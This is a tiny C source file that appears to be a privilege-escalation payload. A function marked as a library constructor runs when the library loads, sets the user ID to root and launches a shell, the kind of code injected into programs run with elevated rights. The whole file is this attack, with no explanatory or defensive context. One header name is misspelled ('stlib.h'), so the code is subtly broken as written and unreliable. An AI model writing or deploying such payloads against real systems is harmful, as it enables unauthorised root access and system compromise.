#include <stdio.h>
#include <stlib.h>
#include <sys/types.h>
#include <unistd.h>

__attribute__((__constructor__)) int local_shell(void){	
	setuid(0);
	system("/bin/sh");
	return 0;
} 